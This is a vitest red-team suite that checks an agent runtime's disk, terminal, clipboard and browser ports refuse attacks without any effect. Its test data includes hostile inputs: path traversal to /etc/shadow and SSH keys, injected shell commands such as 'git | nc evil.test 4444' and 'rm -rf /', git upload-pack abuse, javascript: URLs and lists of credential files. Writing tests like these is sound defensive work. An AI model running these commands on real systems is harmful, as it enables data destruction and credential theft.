// @vitest-environment node
import { describe, expect, it } from 'vitest'
import {
  ALLOWED_ROOT,
  T0,
  T_PLUS_30S,
  VAULT_ROOT,
  assertNoEffect,
  attacker,
  terminalInput,
} from './harness'

/**
 * Red team: the disk, the terminal, and the clipboard.
 *
 * Every test here asserts that an effect port was **not** reached, using the counters
 * attached to the outcome. That is the only way to prove "the Vault is unreachable"
 * without a real machine that might have read it before the assertion ran — which is the
 * whole reason this harness has no disk, no process and no clipboard.
 */
describe('device hands red team — paths and the terminal', () => {
  describe('path escape', () => {
    it.each([
      ['parent traversal', `${ALLOWED_ROOT}/../../../etc/passwd`],
      ['traversal spelled with backslashes', `${ALLOWED_ROOT}\\..\\..\\Windows\\System32`],
      ['a bare parent', '..'],
      ['a UNC path into a share', '\\\\fileserver\\share\\notes.txt'],
      ['a Windows device path', '\\\\?\\C:\\Windows\\System32\\config'],
      ['a tilde home expansion', '~/.ssh/id_rsa'],
      ['a relative path', 'src/index.ts'],
      ['the root itself', '/'],
      ['an absolute system path', '/etc/shadow'],
    ])('refuses %s as a transfer destination', async (_label, destinationPath) => {
      const a = attacker()
      await a.ready()

      const result = await a.attempt({
        actionId: `atk-${_label}`,
        actionKey: 'transfer.download',
        input: {
          url: 'https://example.com/notes.txt',
          destinationPath,
          fileName: 'notes.txt',
          mediaType: 'text/plain',
          bytes: 16,
        },
      })

      expect(result.effects).toBe(0)
      assertNoEffect(result)
      expect(['path-malformed', 'path-outside-allowlist', 'credential-store-denied', 'vault-path-denied']).toContain(
        result.code,
      )
    })

    it.each([
      ['the vault', VAULT_ROOT],
      ['the vault database', `${VAULT_ROOT}/freya.db`],
      ['a vault backup', `${VAULT_ROOT}/backups/2026-07-01.db`],
      ['the vault, in another case', VAULT_ROOT.toUpperCase()],
      ['the keyring', '/user-data/Freya.keyring.json'],
      ['an ssh key directory', '/home/freya/.ssh'],
      ['an aws credentials file', '/home/freya/.aws/credentials'],
      ['a browser cookie store', '/home/freya/.config/chromium/Cookies'],
      ['a dotenv', '/home/freya/.env'],
      ['a pem private key', '/home/freya/server.pem'],
    ])('refuses %s outright', async (_label, deniedRoot) => {
      const a = attacker()
      await a.ready()

      const result = await a.attempt({
        actionId: `atk-${_label}`,
        actionKey: 'transfer.download',
        input: {
          url: 'https://example.com/notes.txt',
          destinationPath: deniedRoot,
          fileName: 'notes.txt',
          mediaType: 'text/plain',
          bytes: 16,
        },
      })

      expect(result.effects).toBe(0)
      assertNoEffect(result)
      expect(['vault-path-denied', 'credential-store-denied', 'path-outside-allowlist']).toContain(result.code)
    })

    it('refuses a credential file even when it sits inside an allowed root', async () => {
      const a = attacker()
      await a.ready()

      for (const fileName of ['.env', '.npmrc', '.git-credentials', 'credentials', 'id_rsa']) {
        const result = await a.attempt({
          actionId: `atk-cred-${fileName}`,
          actionKey: 'transfer.download',
          input: {
            url: 'https://example.com/x.txt',
            destinationPath: ALLOWED_ROOT,
            fileName,
            mediaType: 'text/plain',
            bytes: 16,
          },
        })
        expect(result.effects, fileName).toBe(0)
        expect(result.code, fileName).toBe('media-type-not-allowed')
      }
    })

    it('refuses a name that smuggles a directory, so the fileName cannot choose its own path', async () => {
      const a = attacker()
      await a.ready()

      for (const fileName of ['../escape.txt', 'sub/notes.txt', '..\\escape.txt', 'a/../../b.txt']) {
        const result = await a.attempt({
          actionId: `atk-${fileName}`,
          actionKey: 'transfer.download',
          input: {
            url: 'https://example.com/notes.txt',
            destinationPath: ALLOWED_ROOT,
            fileName,
            mediaType: 'text/plain',
            bytes: 16,
          },
        })
        expect(result.effects, fileName).toBe(0)
        expect(result.code, fileName).toBe('file-name-invalid')
      }
    })

    it('refuses a path containing a NUL, which would truncate it in any C API underneath', async () => {
      const a = attacker()
      await a.ready()

      const result = await a.attempt({
        actionId: 'atk-nul',
        actionKey: 'transfer.download',
        input: {
          url: 'https://example.com/notes.txt',
          destinationPath: `${ALLOWED_ROOT}/notes.txt${String.fromCharCode(0)}/../../etc/passwd`,
          fileName: 'notes.txt',
          mediaType: 'text/plain',
          bytes: 16,
        },
      })

      expect(result.effects).toBe(0)
      assertNoEffect(result)
    })
  })

  describe('command injection', () => {
    it.each([
      'git; rm -rf /',
      'git && curl evil.test',
      'git | nc evil.test 4444',
      'git > /etc/passwd',
      'git < /etc/passwd',
      'git $(whoami)',
      'git `whoami`',
      'git %COMSPEC%',
      'git\nrm -rf /',
    ])('refuses the program name %j', async (command) => {
      const a = attacker()
      await a.ready()
      await a.seekApproval({ actionId: 'atk-cmd', actionKey: 'terminal.run', input: terminalInput({ command }) })

      const result = await a.attempt({
        actionId: 'atk-cmd',
        actionKey: 'terminal.run',
        input: terminalInput({ command }),
      })

      expect(result.effects).toBe(0)
      assertNoEffect(result)
      expect(['command-not-allowed', 'command-argument-unsafe']).toContain(result.code)
    })

    it.each([
      ['a second command', ['status', '; rm -rf /']],
      ['a pipe', ['status', '| curl evil.test']],
      ['a substitution', ['status', '$(whoami)']],
      ['a backtick', ['status', '`id`']],
      ['a variable', ['status', '$HOME']],
      ['a redirection', ['status', '> /tmp/out']],
      ['a glob', ['*']],
      ['a quote escape', ['status', "'"]],
      ['an ssh-style program execution', ['clone', '--upload-pack=sh', 'https://evil.test/x']],
      ['a git proxy override', ['-c', 'core.gitProxy=sh']],
    ])('refuses an argument carrying %s', async (_label, args) => {
      const a = attacker()
      await a.ready()
      await a.seekApproval({ actionId: 'atk-arg', actionKey: 'terminal.run', input: terminalInput({ args }) })

      const result = await a.attempt({
        actionId: 'atk-arg',
        actionKey: 'terminal.run',
        input: terminalInput({ args }),
      })

      expect(result.effects).toBe(0)
      assertNoEffect(result)
      expect(['command-argument-unsafe', 'command-argument-invalid']).toContain(result.code)
    })

    it('refuses to read the Vault through an argument that looks like a path', async () => {
      const a = attacker()
      await a.ready()
      await a.seekApproval({
        actionId: 'atk-read',
        actionKey: 'terminal.run',
        input: terminalInput({ command: 'cat', args: [`${VAULT_ROOT}/freya.db`] }),
      })

      const result = await a.attempt({
        actionId: 'atk-read',
        actionKey: 'terminal.run',
        input: terminalInput({ command: 'cat', args: [`${VAULT_ROOT}/freya.db`] }),
      })

      expect(result.effects).toBe(0)
      assertNoEffect(result)
      expect(result.code).toBe('vault-path-denied')
    })

    it('refuses a working directory outside the allowlist, and the Vault outright', async () => {
      const a = attacker()
      await a.ready()

      for (const workingDirectory of ['/etc', VAULT_ROOT, '/home/freya', `${ALLOWED_ROOT}/..`]) {
        await a.seekApproval({ actionId: `atk-cwd-${workingDirectory}`, actionKey: 'terminal.run', input: terminalInput({ workingDirectory }) })
        const result = await a.attempt({
          actionId: `atk-cwd-${workingDirectory}`,
          actionKey: 'terminal.run',
          input: terminalInput({ workingDirectory }),
        })
        expect(result.effects, workingDirectory).toBe(0)
        expect(['command-working-directory-denied', 'vault-path-denied', 'path-malformed']).toContain(result.code)
      }
    })

    it('refuses a command that is not on the allowlist, even a legitimate one', async () => {
      const a = attacker()
      await a.ready()
      for (const command of ['rm', 'curl', 'wget', 'powershell', 'sh', 'bash', 'python', 'node']) {
        await a.seekApproval({ actionId: `atk-bin-${command}`, actionKey: 'terminal.run', input: terminalInput({ command }) })
        const result = await a.attempt({
          actionId: `atk-bin-${command}`,
          actionKey: 'terminal.run',
          input: terminalInput({ command }),
        })
        expect(result.effects, command).toBe(0)
        expect(result.code, command).toBe('command-not-allowed')
      }
    })

    it('builds the environment from the allowlist, so nothing can be inherited into it', async () => {
      const a = attacker()
      await a.ready()

      for (const name of ['PATH', 'HOME', 'LD_PRELOAD', 'DYLD_INSERT_LIBRARIES', 'AWS_SECRET_ACCESS_KEY']) {
        await a.seekApproval({ actionId: `atk-env-${name}`, actionKey: 'terminal.run', input: terminalInput({ env: { [name]: 'x' } }) })
        const result = await a.attempt({
          actionId: `atk-env-${name}`,
          actionKey: 'terminal.run',
          input: terminalInput({ env: { [name]: 'x' } }),
        })
        expect(result.effects, name).toBe(0)
        expect(result.code, name).toBe('environment-variable-not-allowed')
      }
    })

    it('refuses more arguments than the ceiling, so a program is not driven by a generated list', async () => {
      const a = attacker()
      await a.ready()
      const args = Array.from({ length: 64 }, (_, i) => `--flag${String(i)}`)
      await a.seekApproval({ actionId: 'atk-many', actionKey: 'terminal.run', input: terminalInput({ args }) })
      const result = await a.attempt({
        actionId: 'atk-many',
        actionKey: 'terminal.run',
        input: terminalInput({ args }),
      })
      expect(result.effects).toBe(0)
      expect(result.code).toBe('command-argument-count-exceeded')
    })
  })

  describe('the clipboard as an exfiltration channel', () => {
    it('cannot be read without an approval', async () => {
      const a = attacker()
      await a.ready()

      const result = await a.attempt({ actionId: 'atk-clip', actionKey: 'clipboard.read' })

      expect(result.effects).toBe(0)
      assertNoEffect(result)
      expect(result.code).toBe('approval-missing')
    })

    it('returns nothing, and records nothing, when the clipboard holds a credential', async () => {
      const a = attacker({ clipboard: '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNz' })
      await a.ready()
      await a.seekApproval({ actionId: 'atk-clip', actionKey: 'clipboard.read', input: {} })

      const result = await a.attempt({ actionId: 'atk-clip', actionKey: 'clipboard.read' })

      expect(result.code).toBe('clipboard-credential-content')
      expect(result.verdict).toBeNull()
      expect(JSON.stringify(a.entries)).not.toContain('OPENSSH')
      // The byte count is kept, because "how much was in there" is legitimate to know.
      expect(a.snapshot().refusals).toEqual([])
      expect(a.journalTypes()).toContain('hands.clipboard.credential-detected')
    })

    it.each([
      ['a password assignment', 'password=hunter2'],
      ['an api key assignment', 'api_key: sk-abcdefghijklmnopqrstuvwx'],
      ['a jwt', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U'],
      ['a url with a password', 'postgres://admin:s3cret@db.internal/app'],
      ['a card number', '4111 1111 1111 1111'],
      ['an aws key id', 'AKIAIOSFODNN7EXAMPLE'],
    ])('refuses %s in either direction', async (_label, content) => {
      const a = attacker()
      await a.ready()

      const write = await a.attempt({
        actionId: `atk-write-${_label}`,
        actionKey: 'clipboard.write',
        input: { text: content },
      })
      expect(write.effects).toBe(0)
      expect(write.code).toBe('clipboard-credential-content')

      a.setClipboard(content)
      await a.seekApproval({ actionId: `atk-read-${_label}`, actionKey: 'clipboard.read', input: {} })
      const read = await a.attempt({ actionId: `atk-read-${_label}`, actionKey: 'clipboard.read' })
      expect(read.code).toBe('clipboard-credential-content')
      expect(JSON.stringify(a.entries)).not.toContain(content.slice(0, 12))
    })

    it('refuses to be told what the clipboard said, so the audit cannot be about the wrong thing', async () => {
      const a = attacker()
      await a.ready()
      await a.seekApproval({ actionId: 'atk-fake', actionKey: 'clipboard.read', input: {} })

      const result = await a.attempt({
        actionId: 'atk-fake',
        actionKey: 'clipboard.read',
        input: { text: 'a note I would like recorded instead' },
      })

      expect(result.effects).toBe(0)
      expect(result.code).toBe('request-malformed')
    })

    it('refuses a clipboard payload large enough to be a file', async () => {
      const a = attacker()
      await a.ready()
      const result = await a.attempt({
        actionId: 'atk-big',
        actionKey: 'clipboard.write',
        input: { text: 'x'.repeat(9000) },
      })
      expect(result.effects).toBe(0)
      expect(result.code).toBe('clipboard-too-large')
    })

    it('refuses binary content, so there is no path by which an image arrives through the clipboard', async () => {
      const a = attacker()
      await a.ready()
      const result = await a.attempt({
        actionId: 'atk-bin',
        actionKey: 'clipboard.write',
        input: { text: `PNG${String.fromCharCode(0)}binary` },
      })
      expect(result.effects).toBe(0)
      expect(result.code).toBe('clipboard-binary-content')
    })
  })

  describe('the browser is not a camera', () => {
    it('refuses every non-http scheme, including the ones that read local files', async () => {
      const a = attacker()
      await a.ready()
      for (const url of [
        'file:///etc/passwd',
        'file:///C:/Windows/System32/config',
        'data:text/html,<script>1</script>',
        'javascript:fetch("file:///etc/passwd")',
        'blob:https://example.com/1234',
        'view-source:https://example.com',
        'chrome://settings',
        'devtools://devtools/bundled/x.html',
      ]) {
        await a.seekApproval({ actionId: `atk-url-${url}`, actionKey: 'browser.navigate', input: { url } })
        const result = await a.attempt({ actionId: `atk-url-${url}`, actionKey: 'browser.navigate', input: { url } })
        expect(result.effects, url).toBe(0)
        assertNoEffect(result)
        expect(['url-scheme-not-allowed', 'url-host-not-allowed']).toContain(result.code)
      }
    })

    it('refuses a host that merely looks like the allowlisted one', async () => {
      const a = attacker()
      await a.ready()
      for (const url of [
        'https://evil.test/',
        'https://example.com.evil.test/',
        'https://sub.example.com/',
        'https://example.com@evil.test/',
        'https://xn--example-com-8db.example.net/',
      ]) {
        await a.seekApproval({ actionId: `atk-host-${url}`, actionKey: 'browser.navigate', input: { url } })
        const result = await a.attempt({ actionId: `atk-host-${url}`, actionKey: 'browser.navigate', input: { url } })
        expect(result.effects, url).toBe(0)
        expect(['url-host-not-allowed', 'url-carries-credential']).toContain(result.code)
      }
    })

    it('refuses a URL carrying a password rather than stripping it and going on', async () => {
      const a = attacker()
      await a.ready()
      await a.seekApproval({
        actionId: 'atk-pass',
        actionKey: 'browser.navigate',
        input: { url: 'https://admin:hunter2@example.com/' },
      })
      const result = await a.attempt({
        actionId: 'atk-pass',
        actionKey: 'browser.navigate',
        input: { url: 'https://admin:hunter2@example.com/' },
      })
      expect(result.effects).toBe(0)
      expect(result.code).toBe('url-carries-credential')
    })

    it('refuses to type a payload with an invisible control character in it', async () => {
      const a = attacker()
      await a.ready()
      await a.seekApproval({
        actionId: 'atk-type',
        actionKey: 'browser.type-text',
        input: { url: 'https://example.com/form', selector: '#q', text: `hello${String.fromCharCode(7)}world` },
      })
      const result = await a.attempt({
        actionId: 'atk-type',
        actionKey: 'browser.type-text',
        input: { url: 'https://example.com/form', selector: '#q', text: `hello${String.fromCharCode(7)}world` },
      })
      expect(result.effects).toBe(0)
      expect(result.code).toBe('request-malformed')
    })

    it('refuses a selector that is a script rather than a locator', async () => {
      const a = attacker()
      await a.ready()
      for (const selector of ['#a[onclick=alert(1)]', 'a[href="javascript:1"]', 'x'.repeat(300)]) {
        await a.seekApproval({ actionId: `atk-sel-${selector.length}`, actionKey: 'browser.click', input: { url: 'https://example.com/', selector } })
        const result = await a.attempt({ actionId: `atk-sel-${selector.length}`, actionKey: 'browser.click', input: { url: 'https://example.com/', selector } })
        expect(result.effects, selector).toBe(0)
        expect(result.code, selector).toBe('request-malformed')
      }
    })
  })

  describe('cancellation and the latch are honest', () => {
    it('refuses to cancel an action that is not on the record, and changes nothing', async () => {
      const a = attacker()
      await a.ready()

      const cancellation = a.runtime.cancel('atk-never-started')

      expect(cancellation.accepted).toBe(false)
      expect(cancellation.reason).toContain('no such action')
      expect(a.effects()).toBe(0)
    })

    it('refuses to cancel a settled action rather than rewriting its outcome', async () => {
      const a = attacker()
      await a.ready()
      await a.attempt({ actionId: 'atk-settled', actionKey: 'browser.navigate' })

      const cancellation = a.runtime.cancel('atk-settled')

      expect(cancellation.accepted).toBe(false)
      expect(a.snapshot().actions['atk-settled']?.outcome).toBe('completed')
    })

    it('never reports completion for an action that never ran', async () => {
      const a = attacker({ enabled: false })
      await a.ready()
      await a.seekApproval({ actionId: 'atk-off', actionKey: 'terminal.run', input: terminalInput() })

      const result = await a.attempt({ actionId: 'atk-off', actionKey: 'terminal.run', input: terminalInput() })

      expect(result.performed).toBe(false)
      expect(result.verdict).toBeNull()
      expect(result.bytes).toBe(0)
      assertNoEffect(result)
      expect(a.snapshot().actions['atk-off']?.outcome).toBe('refused')
    })

    it('never treats a report as a verification', async () => {
      const a = attacker({ observes: false })
      await a.ready()

      const result = await a.attempt({ actionId: 'atk-report', actionKey: 'browser.navigate' })

      expect(result.verdict).toBe('unverified')
      expect(a.snapshot().actions['atk-report']?.outcome).toBe('unverified')
      expect(a.snapshot().bytesThisSession).toBe(0)
    })
  })

  describe('replay and idempotence', () => {
    it('refuses the same action id twice, even across a restart', async () => {
      const a = attacker()
      await a.ready()

      const first = await a.attempt({ actionId: 'atk-replay', actionKey: 'browser.navigate' })
      expect(first.effects).toBe(1)

      const second = await a.attempt({ actionId: 'atk-replay', actionKey: 'browser.navigate' })
      expect(second.code).toBe('replay-detected')
      expect(second.effects).toBe(0)

      const restarted = await a.restart()
      const third = await restarted.perform({
        actionId: 'atk-replay',
        principalId: 'owner-1',
        scope: 'session-1',
        actionKey: 'browser.navigate',
        claimsAction: null,
        input: { url: 'https://example.com/about' },
        deadlineAt: T_PLUS_30S,
        at: T0,
      })
      expect(third.code).toBe('replay-detected')
      expect(a.effects()).toBe(1)
    })

    it('refuses to re-present a refused id, so a refusal cannot be laundered into a second attempt', async () => {
      const a = attacker()
      await a.ready()

      const refused = await a.attempt({ actionId: 'atk-launder', actionKey: 'terminal.run', input: terminalInput() })
      expect(refused.code).toBe('approval-missing')

      const again = await a.attempt({ actionId: 'atk-launder', actionKey: 'terminal.run', input: terminalInput() })
      expect(again.code).toBe('replay-detected')
      expect(a.calls('terminal')).toBe(0)
    })

    it('binds an approval to its action id, so it cannot be replayed under a new one', async () => {
      const a = attacker()
      await a.ready()
      await a.seekApproval({ actionId: 'atk-first', actionKey: 'terminal.run', input: terminalInput() })

      const first = await a.attempt({ actionId: 'atk-first', actionKey: 'terminal.run', input: terminalInput() })
      expect(first.effects).toBe(1)

      const replayed = await a.attempt({ actionId: 'atk-second', actionKey: 'terminal.run', input: terminalInput() })
      expect(replayed.code).toBe('approval-subject-mismatch')
      expect(replayed.effects).toBe(0)
      expect(a.calls('terminal')).toBe(1)
    })
  })
})